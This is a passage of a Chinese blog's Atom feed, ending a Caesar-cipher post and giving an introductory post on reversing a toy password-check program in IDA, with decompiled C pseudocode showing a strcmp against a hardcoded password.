class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;凯撒密码C&quot;&gt;&lt;a href=&quot;#凯撒密码C&quot; class=&quot;headerlink&quot; title=&quot;凯撒密码C++&quot;&gt;&lt;/a&gt;凯撒密码C++&lt;/h1&gt;&lt;p&gt;  在密码学中，恺撒密码（英语：Caesar cipher），或称恺撒加密、恺撒变换、变换加密，是一种最简单
      
    
    </summary>
    
      <category term="密码学" scheme="https://singlemindedt.github.io/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
      <category term="密码学" scheme="https://singlemindedt.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>初探栈溢出</title>
    <link href="https://singlemindedt.github.io/2019/10/10/%E5%88%9D%E6%8E%A2%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    <id>https://singlemindedt.github.io/2019/10/10/初探栈溢出/</id>
    <published>2019-10-10T14:09:17.000Z</published>
    <updated>2019-12-18T00:12:45.763Z</updated>
    
    <content type="html"><![CDATA[<p>这里给出一个简单的exe文件，实现的功能为：让用户键入密码，程序将之与固定密码(1234567)进行比较，如果错误继续键入，成功则提示“Congratulation! You have passed the verification!”</p><p>将程序拖入IDA，在左边窗口有<strong>函数名称</strong>列表，找到_main函数双击，可以看到其程序流程图：<br><img src="https://s2.ax1x.com/2019/12/09/QwnPV1.png" alt="QwnPV1.png"></p><p>伪代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+0h] [ebp-8h]//变量v4</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_4010A7(aPleaseInputPas, v4);<span class="comment">//函数sub_4010A7需要调用两个参数aPleaseInputPas, v4</span></span><br><span class="line">    <span class="built_in">scanf</span>(aS, &amp;v4);<span class="comment">//输入v4</span></span><br><span class="line">    <span class="keyword">if</span> ( !sub_401000(&amp;v4) )<span class="comment">//若sub_401000(&amp;v4)==0调用 sub_4010A7(aIncorrectPassw, v4)</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    sub_4010A7(aIncorrectPassw, v4);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> sub_4010A7(aCongratulation, v4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们接下来查看 判断函数sub_401000：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_401000</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strcmp</span>(a1, a1234567);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*比较两个字符串</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">设这两个字符串为str1，str2，</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">若str1=str2，则返回零；</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">若str1&lt;str2，则返回负数；</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">若str1&gt;str2，则返回正数。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>查看sub_4010A7：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_4010A7</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// ebx</span></span><br><span class="line"></span><br><span class="line">  v2 = _stbuf(&amp;stru_4080E0);</span><br><span class="line">  v3 = sub_401E34(&amp;stru_4080E0, a1, (<span class="keyword">int</span>)&amp;a2);</span><br><span class="line">  _ftbuf(v2, &amp;stru_4080E0);</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这里给出一个简单的exe文件，实现的功能为：让用户键入密码，程序将之与固定密码(1234567)进行比较，如果错误继续键入，成功则提示“Congratulation! You have passed the verification!”&lt;/p&gt;
&lt;p&gt;将程序拖入IDA，在左
      
    
    </summary>
    
      <category term="notes" scheme="https://singlemindedt.github.io/categories/notes/"/>
    
    
      <category term="re" scheme="https://singlemindedt.github.io/tags/re/"/>
    
  </entry>
  
</feed>
